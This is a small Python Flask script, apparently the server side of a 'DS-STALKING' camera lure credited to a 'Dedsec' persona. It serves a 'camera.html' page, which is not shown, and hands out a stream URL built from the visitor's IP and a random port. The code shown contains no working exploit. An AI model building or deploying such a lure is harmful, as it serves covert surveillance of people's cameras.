from flask import Flask, render_template, request, jsonify
import socket
import pyfiglet
import random

# Créer une interface ASCII art avec pyfiglet
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Afficher l'interface ASCII au démarrage
display_interface()

# Initialiser l'application Flask
app = Flask(__name__)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

@app.route("/")
def home():
    # Cette fonction rend le fichier camera.html lorsqu'on visite la page d'accueil
    return render_template("camera.html")

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Génère un lien contenant l'adresse IP et le port
    client_ip = request.remote_addr
    port = random.randint(10000, 65535)  # Générer un port aléatoire
    stream_url = f"http://{client_ip}:{port}/stream"
    return jsonify({"stream_url": stream_url})

if __name__ == "__main__":
    # Exécuter le serveur Flask avec un port aléatoire entre 10000 et 65535
    local_ip = get_local_ip()
    print(f"Serveur en cours d'exécution : http://{local_ip}:5000")
    
    # Lancer le serveur sans SSL
    app.run(host="0.0.0.0", port=5000)  # Vous pouvez aussi changer le port si nécessaire